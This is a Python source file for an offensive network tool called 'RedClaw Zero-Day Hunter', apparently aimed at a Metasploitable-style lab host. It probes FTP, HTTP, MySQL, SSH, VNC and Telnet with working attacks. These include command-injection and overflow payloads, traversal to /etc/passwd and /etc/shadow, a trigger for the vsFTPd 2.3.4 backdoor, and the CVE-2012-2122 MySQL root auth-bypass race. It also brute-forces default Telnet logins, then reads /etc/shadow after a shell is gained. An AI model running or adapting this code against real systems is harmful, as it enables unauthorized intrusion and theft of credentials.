"""
RedClaw V3.1 - Zero-Day Hunter Module

Autonomous zero-day hunting via protocol fuzzing, boundary testing,
and anomaly detection. Uses only Python stdlib.

Usage:
    python src/redclaw/zeroday_hunter.py 192.168.1.83
"""
from __future__ import annotations

import asyncio
import json
import os
import re
import socket
import sys
import time
from datetime import datetime
from typing import Any, Dict, List, Optional

# Fix Windows console encoding
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass


class ZeroDayHunter:
    """
    Autonomous zero-day hunter that probes services for anomalous behavior
    using fuzzing, protocol manipulation, and boundary testing.
    """

    def __init__(self, target: str):
        self.target = target
        self.anomalies: List[Dict] = []
        self.start_time = time.time()
        self.work_dir = os.path.join(
            os.path.expanduser("~/.redclaw"), "zeroday",
            f"{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        )
        os.makedirs(self.work_dir, exist_ok=True)

    def _banner(self, title: str):
        print(f"\n{'=' * 60}", flush=True)
        print(f"  {title}", flush=True)
        print(f"{'=' * 60}\n", flush=True)

    def _log(self, msg: str):
        print(f"  [*] {msg}", flush=True)

    def _found(self, service: str, test: str, detail: str, severity: str = "ANOMALY"):
        """Record a potential zero-day anomaly."""
        entry = {
            "service": service,
            "test": test,
            "detail": detail,
            "severity": severity,
            "timestamp": datetime.now().isoformat(),
        }
        self.anomalies.append(entry)
        marker = "[!!!]" if severity == "POTENTIAL_VULN" else "[??]" if severity == "ANOMALY" else "[*]"
        print(f"  {marker} {severity}: {service} - {test}", flush=True)
        print(f"        {detail[:150]}", flush=True)

    # ================================================================
    # FTP Deep Probing
    # ================================================================

    async def fuzz_ftp(self, port: int = 21):
        """Deep FTP protocol fuzzing."""
        self._banner("FTP ZERO-DAY HUNTING")

        # Test 1: FTP Command Injection
        self._log("Test 1: FTP command injection via USER/PASS fields...")
        injection_payloads = [
            ("USER", b"USER anonymous; ls -la\r\n"),
            ("USER", b"USER `id`\r\n"),
            ("USER", b"USER $(whoami)\r\n"),
            ("USER", b"USER {{7*7}}\r\n"),
            ("PASS", b"PASS %n%n%n%n\r\n"),           # format string
            ("PASS", b"PASS " + b"A" * 500 + b"\r\n"),  # buffer overflow
        ]

        for name, payload in injection_payloads:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target, port))
                banner = sock.recv(1024)
                if name == "PASS":
                    sock.send(b"USER anonymous\r\n")
                    sock.recv(1024)
                sock.send(payload)
                resp = sock.recv(2048).decode("utf-8", errors="replace")
                sock.close()

                # Check for anomalous responses
                if "500" not in resp and "530" not in resp and "331" not in resp and "230" not in resp:
                    self._found("FTP", f"Unusual response to {name} injection",
                                f"Payload: {payload[:50]}... Response: {resp[:100]}", "ANOMALY")
                elif "root" in resp.lower() or "uid=" in resp:
                    self._found("FTP", f"Command injection via {name}!",
                                f"Response contains system info: {resp[:150]}", "POTENTIAL_VULN")
                else:
                    self._log(f"  {name} injection: normal response ({resp[:30].strip()})")
            except socket.timeout:
                self._found("FTP", f"{name} timeout (possible DoS)",
                            f"Server hung on payload: {payload[:50]}", "ANOMALY")
            except ConnectionResetError:
                self._found("FTP", f"{name} connection reset",
                            f"Server crashed/reset on: {payload[:50]}", "ANOMALY")
            except Exception as e:
                self._log(f"  {name} injection error: {e}")

        # Test 2: FTP Path Traversal
        self._log("Test 2: FTP path traversal...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, port))
            sock.recv(1024)
            sock.send(b"USER anonymous\r\n")
            sock.recv(1024)
            sock.send(b"PASS anon@test.com\r\n")
            resp = sock.recv(1024).decode("utf-8", errors="replace")

            if "230" in resp:
                traversal_paths = [
                    "/../../../etc/passwd",
                    "/..%2f..%2f..%2fetc/passwd",
                    "/.%00/etc/passwd",
                    "/etc/shadow",
                    "/proc/self/cmdline",
                    "/proc/version",
                ]
                for path in traversal_paths:
                    sock.send(f"CWD {path}\r\n".encode())
                    cwd_resp = sock.recv(1024).decode("utf-8", errors="replace")
                    if "250" in cwd_resp:
                        self._found("FTP", f"Path traversal successful: {path}",
                                    f"CWD to {path} returned 250 OK", "POTENTIAL_VULN")
                    elif "550" not in cwd_resp and "500" not in cwd_resp:
                        self._found("FTP", f"Unusual CWD response for {path}",
                                    f"Response: {cwd_resp[:100]}", "ANOMALY")
                    else:
                        self._log(f"  Path {path}: blocked ({cwd_resp[:20].strip()})")

                # Test 3: FTP SITE command injection
                self._log("Test 3: FTP SITE command injection...")
                site_cmds = [
                    b"SITE EXEC id\r\n",
                    b"SITE EXEC cat /etc/passwd\r\n",
                    b"SITE CHMOD 777 /etc/passwd\r\n",
                    b"SITE CPFR /etc/passwd\r\n",
                ]
                for cmd in site_cmds:
                    sock.send(cmd)
                    site_resp = sock.recv(1024).decode("utf-8", errors="replace")
                    if "200" in site_resp or "root:" in site_resp:
                        self._found("FTP", f"SITE command executed: {cmd.decode().strip()}",
                                    f"Response: {site_resp[:150]}", "POTENTIAL_VULN")
                    elif "500" not in site_resp and "502" not in site_resp:
                        self._found("FTP", f"Unusual SITE response",
                                    f"Cmd: {cmd.decode().strip()} -> {site_resp[:100]}", "ANOMALY")
                    else:
                        self._log(f"  SITE: blocked ({site_resp[:20].strip()})")

            sock.close()
        except Exception as e:
            self._log(f"  FTP traversal error: {e}")

        # Test 4: vsFTPd 2.3.4 backdoor trigger
        self._log("Test 4: vsFTPd 2.3.4 backdoor check (port 6200)...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, port))
            sock.recv(1024)
            # Trigger backdoor: username with :) smiley
            sock.send(b"USER backdoor:)\r\n")
            sock.recv(1024)
            sock.send(b"PASS anything\r\n")
            try:
                sock.recv(1024)
            except Exception:
                pass
            sock.close()

            # Check if backdoor port 6200 opened
            await asyncio.sleep(1)
            try:
                bd_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                bd_sock.settimeout(3)
                result = bd_sock.connect_ex((self.target, 6200))
                if result == 0:
                    bd_sock.send(b"id\n")
                    bd_resp = bd_sock.recv(1024).decode("utf-8", errors="replace")
                    self._found("FTP", "vsFTPd 2.3.4 BACKDOOR ACTIVE!",
                                f"Port 6200 open! Response: {bd_resp[:150]}", "POTENTIAL_VULN")
                else:
                    self._log("  Backdoor port 6200: closed")
                bd_sock.close()
            except Exception:
                self._log("  Backdoor port 6200: not responding")
        except Exception as e:
            self._log(f"  Backdoor test error: {e}")

    # ================================================================
    # HTTP Deep Probing
    # ================================================================

    async def fuzz_http(self, port: int = 80):
        """Deep HTTP protocol fuzzing."""
        self._banner("HTTP ZERO-DAY HUNTING")
        import http.client

        # Test 1: HTTP verb tampering
        self._log("Test 1: HTTP verb tampering...")
        unusual_verbs = ["PROPFIND", "TRACE", "CONNECT", "PATCH", "MOVE", "COPY", "LOCK"]
        for verb in unusual_verbs:
            try:
                conn = http.client.HTTPConnection(self.target, port, timeout=5)
                conn.request(verb, "/")
                resp = conn.getresponse()
                body = resp.read(2048).decode("utf-8", errors="replace")
                if resp.status != 405 and resp.status != 501:
                    self._found("HTTP", f"{verb} method allowed (status {resp.status})",
                                f"Body: {body[:100]}", "ANOMALY")
                else:
                    self._log(f"  {verb}: {resp.status}")
                conn.close()
            except Exception as e:
                self._log(f"  {verb}: error ({e})")

        # Test 2: Path traversal variants
        self._log("Test 2: HTTP path traversal variants...")
        traversal_paths = [
            "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/.%00.html",
            "/..;/..;/..;/etc/passwd",
            "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/icons/.%2e/%2e%2e/etc/passwd",
            "/cgi-bin/test-cgi",
            "/cgi-bin/printenv",
            "/server-status",
            "/server-info",
        ]
        for path in traversal_paths:
            try:
                conn = http.client.HTTPConnection(self.target, port, timeout=5)
                conn.request("GET", path)
                resp = conn.getresponse()
                body = resp.read(2048).decode("utf-8", errors="replace")
                if resp.status == 200:
                    if "root:" in body:
                        self._found("HTTP", f"Path traversal: {path}",
                                    f"GOT /etc/passwd! -> {body[:150]}", "POTENTIAL_VULN")
                    elif "SERVER_" in body or "DOCUMENT_ROOT" in body:
                        self._found("HTTP", f"Info disclosure: {path}",
                                    f"Server env leaked: {body[:150]}", "POTENTIAL_VULN")
                    elif "/server-" in path:
                        self._found("HTTP", f"Server info exposed: {path}",
                                    f"Status page accessible", "ANOMALY")
                    else:
                        self._log(f"  {path}: 200 OK (no sensitive data)")
                else:
                    self._log(f"  {path}: {resp.status}")
                conn.close()
            except Exception:
                pass

        # Test 3: Header injection
        self._log("Test 3: HTTP header injection...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, port))
            # Malformed Host header
            sock.send(b"GET / HTTP/1.1\r\nHost: " + b"A" * 5000 + b"\r\n\r\n")
            resp = sock.recv(4096).decode("utf-8", errors="replace")
            if "500" in resp or "error" in resp.lower():
                self._found("HTTP", "Long Host header causes error",
                            f"Possible buffer issue: {resp[:100]}", "ANOMALY")
            elif not resp:
                self._found("HTTP", "Server crashed on oversized Host header",
                            "No response received - possible DoS", "POTENTIAL_VULN")
            else:
                self._log(f"  Oversized Host: handled normally")
            sock.close()
        except socket.timeout:
            self._found("HTTP", "Server hung on oversized header",
                        "Timeout after 5s - possible DoS", "ANOMALY")
        except Exception as e:
            self._log(f"  Header injection error: {e}")

        # Test 4: Hidden directories/files
        self._log("Test 4: Hidden file/directory discovery...")
        hidden_paths = [
            "/.git/config", "/.svn/entries", "/.env", "/.htpasswd",
            "/.htaccess", "/wp-config.php", "/robots.txt", "/sitemap.xml",
            "/phpinfo.php", "/info.php", "/test.php", "/phpmyadmin/",
            "/admin/", "/manager/", "/shell/", "/console/",
            "/debug/", "/backup/", "/config/", "/tmp/",
            "/phpMyAdmin/", "/mutillidae/", "/dvwa/", "/tikiwiki/",
            "/twiki/", "/dav/",
        ]
        for path in hidden_paths:
            try:
                conn = http.client.HTTPConnection(self.target, port, timeout=3)
                conn.request("GET", path)
                resp = conn.getresponse()
                body = resp.read(1024).decode("utf-8", errors="replace")
                if resp.status == 200:
                    title = ""
                    m = re.search(r"<title>([^<]+)</title>", body, re.IGNORECASE)
                    if m:
                        title = m.group(1).strip()
                    self._found("HTTP", f"Hidden path: {path} (200 OK)",
                                f"Title: {title or '(none)'}, Size: {len(body)}b",
                                "POTENTIAL_VULN" if any(x in path for x in [".git", ".env", "phpinfo", "phpmyadmin", "admin"]) else "ANOMALY")
                conn.close()
            except Exception:
                pass

    # ================================================================
    # MySQL Deep Probing
    # ================================================================

    async def fuzz_mysql(self, port: int = 3306):
        """MySQL authentication bypass and injection testing."""
        self._banner("MySQL ZERO-DAY HUNTING")

        # Test 1: Auth bypass (CVE-2012-2122 race condition)
        self._log("Test 1: MySQL auth bypass race condition (CVE-2012-2122)...")
        self._log("  Attempting 300 rapid connections with wrong password...")
        bypass_count = 0
        for i in range(300):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target, port))
                greeting = sock.recv(1024)
                if len(greeting) < 5:
                    sock.close()
                    continue

                # Extract protocol info
                proto_ver = greeting[0]
                # Send auth response with wrong password
                # MySQL native auth packet (simplified)
                auth_packet = bytearray(b"\x00" * 32)  # capabilities + max packet + charset + reserved
                auth_packet += b"root\x00"  # username
                auth_packet += b"\x14" + b"\x00" * 20  # wrong password hash
                length = len(auth_packet)
                header = length.to_bytes(3, 'little') + b"\x01"
                sock.send(header + bytes(auth_packet))

                resp = sock.recv(1024)
                if resp and len(resp) > 4:
                    # Check if we got OK packet (0x00) instead of Error (0xFF)
                    if resp[4] == 0x00:
                        bypass_count += 1
                        if bypass_count == 1:
                            self._found("MySQL", "AUTH BYPASS SUCCESSFUL!",
                                        f"Root login accepted with wrong password on attempt {i+1}!",
                                        "POTENTIAL_VULN")
                sock.close()
            except Exception:
                pass

        if bypass_count > 0:
            self._found("MySQL", f"Auth bypass succeeded {bypass_count}/300 times",
                        "CVE-2012-2122 race condition confirmed", "POTENTIAL_VULN")
        else:
            self._log(f"  Auth bypass: failed (0/300)")

        # Test 2: Oversized username
        self._log("Test 2: Oversized username buffer test...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, port))
            greeting = sock.recv(1024)

            # Send massively long username
            long_user = b"A" * 10000 + b"\x00"
            auth_packet = bytearray(b"\x00" * 32)
            auth_packet += long_user
            auth_packet += b"\x00"
            length = len(auth_packet)
            header = length.to_bytes(3, 'little') + b"\x01"
            sock.send(header + bytes(auth_packet))

            resp = sock.recv(4096).decode("utf-8", errors="replace")
            self._log(f"  Oversized username: response {len(resp)} bytes")
            sock.close()
        except ConnectionResetError:
            self._found("MySQL", "Server crashed on oversized username",
                        "ConnectionReset after 10000-byte username", "ANOMALY")
        except socket.timeout:
            self._found("MySQL", "Server hung on oversized username",
                        "Timeout - possible DoS condition", "ANOMALY")
        except Exception as e:
            self._log(f"  Oversized username error: {e}")

    # ================================================================
    # SSH Deep Probing
    # ================================================================

    async def fuzz_ssh(self, port: int = 22):
        """SSH protocol fuzzing."""
        self._banner("SSH ZERO-DAY HUNTING")

        # Test 1: Banner analysis
        self._log("Test 1: SSH version analysis...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, port))
            banner = sock.recv(1024).decode("utf-8", errors="replace").strip()
            sock.close()
            self._log(f"  Banner: {banner}")

            # Check for known vulnerable versions
            if "4.7p1" in banner or "4.7" in banner:
                self._found("SSH", "Vulnerable OpenSSH version",
                            f"{banner} - multiple CVEs (user enum, weak crypto)", "ANOMALY")
        except Exception as e:
            self._log(f"  Banner error: {e}")

        # Test 2: Key exchange overflow
        self._log("Test 2: SSH oversized banner test...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, port))
            sock.recv(1024)
            # Send oversized client banner
            sock.send(b"SSH-2.0-" + b"A" * 5000 + b"\r\n")
            resp = sock.recv(4096)
            if resp:
                self._log(f"  Oversized banner: server responded ({len(resp)} bytes)")
            else:
                self._found("SSH", "No response to oversized banner",
                            "Server may have crashed", "ANOMALY")
            sock.close()
        except ConnectionResetError:
            self._found("SSH", "Server reset on oversized banner",
                        "Possible buffer handling issue", "ANOMALY")
        except socket.timeout:
            self._found("SSH", "Server timeout on oversized banner",
                        "Possible DoS condition", "ANOMALY")
        except Exception as e:
            self._log(f"  SSH overflow error: {e}")

    # ================================================================
    # VNC Deep Probing
    # ================================================================

    async def fuzz_vnc(self, port: int = 5900):
        """VNC authentication and protocol fuzzing."""
        self._banner("VNC ZERO-DAY HUNTING")

        # Test 1: Auth type check
        self._log("Test 1: VNC authentication type analysis...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, port))
            banner = sock.recv(1024).decode("utf-8", errors="replace")
            self._log(f"  Version: {banner.strip()}")

            if "003.003" in banner:
                # RFB 3.3 - server chooses auth
                sock.send(banner.encode())  # echo version back
                auth = sock.recv(1024)
                if auth:
                    auth_type = int.from_bytes(auth[:4], 'big') if len(auth) >= 4 else -1
                    if auth_type == 1:
                        self._found("VNC", "VNC NO AUTHENTICATION REQUIRED!",
                                    f"Auth type 1 = None. Full desktop access without password!",
                                    "POTENTIAL_VULN")
                    elif auth_type == 2:
                        self._log("  Auth type 2 (VNC password) - testing...")
                        # Try empty/null password
                        sock.send(b"\x00" * 16)  # DES encrypted challenge with null key
                        result = sock.recv(1024)
                        if result and len(result) >= 4:
                            status = int.from_bytes(result[:4], 'big')
                            if status == 0:
                                self._found("VNC", "VNC NULL PASSWORD ACCEPTED!",
                                            "Empty password grants desktop access", "POTENTIAL_VULN")
                            else:
                                self._log("  Null password: rejected")
                    else:
                        self._log(f"  Auth type: {auth_type}")
            sock.close()
        except Exception as e:
            self._log(f"  VNC auth error: {e}")

    # ================================================================
    # Telnet Deep Probing
    # ================================================================

    async def fuzz_telnet(self, port: int = 23):
        """Telnet protocol and login fuzzing."""
        self._banner("TELNET ZERO-DAY HUNTING")

        # Test 1: Default credentials
        self._log("Test 1: Default credential testing...")
        default_creds = [
            (b"root", b"root"),
            (b"admin", b"admin"),
            (b"root", b"toor"),
            (b"msfadmin", b"msfadmin"),
            (b"user", b"user"),
            (b"postgres", b"postgres"),
            (b"root", b""),
        ]

        for user, passwd in default_creds:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(8)
                sock.connect((self.target, port))
                await asyncio.sleep(1)
                # Read banner/negotiation
                banner = b""
                try:
                    while True:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        banner += chunk
                        if b"login:" in banner.lower() or b"username:" in banner.lower():
                            break
                except socket.timeout:
                    pass

                if b"login" in banner.lower():
                    sock.send(user + b"\n")
                    await asyncio.sleep(1)
                    resp1 = sock.recv(4096)

                    if b"password" in resp1.lower() or b"Password" in resp1:
                        sock.send(passwd + b"\n")
                        await asyncio.sleep(2)
                        resp2 = sock.recv(4096).decode("utf-8", errors="replace")

                        if "$" in resp2 or "#" in resp2 or "~" in resp2 or "Last login" in resp2:
                            priv = "ROOT" if "#" in resp2 else "USER"
                            self._found("Telnet", f"DEFAULT CREDS: {user.decode()}:{passwd.decode()} ({priv})",
                                        f"Shell prompt found: {resp2[:100]}", "POTENTIAL_VULN")

                            # If we got shell, try to get system info
                            if "#" in resp2 or "$" in resp2:
                                sock.send(b"id && uname -a && cat /etc/shadow | head -3\n")
                                await asyncio.sleep(1)
                                sysinfo = sock.recv(8192).decode("utf-8", errors="replace")
                                self._found("Telnet", f"POST-EXPLOIT: System info via {user.decode()}",
                                            f"Output: {sysinfo[:200]}", "POTENTIAL_VULN")
                        else:
                            self._log(f"  {user.decode()}:{passwd.decode()} - rejected")
                sock.close()
            except Exception as e:
                self._log(f"  {user.decode()} error: {str(e)[:50]}")

    # ================================================================
    # Main Runner
    # ================================================================

    async def run(self):
        """Execute all zero-day hunting probes."""
        self._banner("REDCLAW V3.1 - ZERO-DAY HUNTER")
        self._log(f"Target: {self.target}")
        self._log(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        self._log(f"Output: {self.work_dir}")

        # 1. Discover open ports first
        self._banner("PORT DISCOVERY")
        ports = {}
        test_ports = {21: "ftp", 22: "ssh", 23: "telnet", 80: "http",
                      139: "netbios", 445: "smb", 3306: "mysql",
                      5432: "postgresql", 5900: "vnc"}

        for port, name in test_ports.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                if sock.connect_ex((self.target, port)) == 0:
                    ports[port] = name
                    self._log(f"  {port}/tcp OPEN ({name})")
                sock.close()
            except Exception:
                pass

        self._log(f"Found {len(ports)} open ports")

        # 2. Run targeted fuzzing
        if 21 in ports:
            await self.fuzz_ftp(21)
        if 80 in ports:
            await self.fuzz_http(80)
        if 3306 in ports:
            await self.fuzz_mysql(3306)
        if 22 in ports:
            await self.fuzz_ssh(22)
        if 5900 in ports:
            await self.fuzz_vnc(5900)
        if 23 in ports:
            await self.fuzz_telnet(23)

        # 3. Summary
        self._banner("ZERO-DAY HUNT RESULTS")
        elapsed = time.time() - self.start_time
        vulns = [a for a in self.anomalies if a["severity"] == "POTENTIAL_VULN"]
        anomalies = [a for a in self.anomalies if a["severity"] == "ANOMALY"]

        self._log(f"Time: {elapsed:.1f}s")
        self._log(f"Total anomalies found: {len(self.anomalies)}")
        self._log(f"  Potential vulnerabilities: {len(vulns)}")
        self._log(f"  Anomalous behaviors: {len(anomalies)}")
        print(flush=True)

        if vulns:
            print("  POTENTIAL VULNERABILITIES:", flush=True)
            for v in vulns:
                print(f"    [!!!] {v['service']}: {v['test']}", flush=True)
                print(f"          {v['detail'][:120]}", flush=True)

        if anomalies:
            print("\n  ANOMALOUS BEHAVIORS:", flush=True)
            for a in anomalies:
                print(f"    [??] {a['service']}: {a['test']}", flush=True)
                print(f"         {a['detail'][:120]}", flush=True)

        # Save results
        results_path = os.path.join(self.work_dir, "zeroday_results.json")
        with open(results_path, "w", encoding="utf-8") as f:
            json.dump({
                "target": self.target,
                "timestamp": datetime.now().isoformat(),
                "elapsed_seconds": elapsed,
                "total_anomalies": len(self.anomalies),
                "potential_vulns": len(vulns),
                "findings": self.anomalies,
            }, f, indent=2)
        self._log(f"Results saved: {results_path}")


async def main():
    if len(sys.argv) < 2:
        print("Usage: python src/redclaw/zeroday_hunter.py <TARGET_IP>")
        sys.exit(1)
    hunter = ZeroDayHunter(sys.argv[1])
    await hunter.run()


if __name__ == "__main__":
    asyncio.run(main())
